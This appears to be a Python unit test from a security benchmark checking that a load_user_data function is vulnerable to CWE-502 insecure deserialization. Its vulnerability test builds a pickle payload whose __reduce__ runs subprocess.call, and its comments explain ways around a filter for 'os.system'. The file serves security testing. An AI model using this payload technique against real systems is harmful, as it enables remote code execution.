import unittest
import pickle
import base64
from GitHub_cwe502_0 import load_user_data

class TestCWE502_0(unittest.TestCase):
    def test_correctness(self):
        data = pickle.dumps({'name': 'Alice'})
        serialized = base64.b64encode(data)
        result = load_user_data(serialized)
        self.assertEqual(result['name'], 'Alice')

    def test_vulnerability(self):
        # Vulnerability: Bypass check for 'os.system'
        # We can use 'os.popen' or just different formatting in the pickle that doesn't contain the literal bytes 'os.system'
        # or just rely on the fact that pickle protocol might not write it contiguously if we use stack opcodes? 
        # Actually simplest bypass is using a different function e.g. 'subprocess.call' or 'posix.system'
        class RCE:
            def __reduce__(self):
                import subprocess
                return (subprocess.call, (['echo', 'hacked'],))
        
        # Note: 'subprocess.call' will appear in the stream, but 'os.system' will not.
        data = pickle.dumps(RCE())
        serialized = base64.b64encode(data)
        
        # This should execute and not raise ValueError
        # We don't verify execution side effect here easily, but we verify it loads successfully
        try:
            load_user_data(serialized)
        except ValueError:
            self.fail("Bypass failed - raised ValueError")
        except Exception:
            # Other errors are fine (e.g. subprocess failing to find output), as long as it passed the check
            pass

if __name__ == '__main__':
    unittest.main()
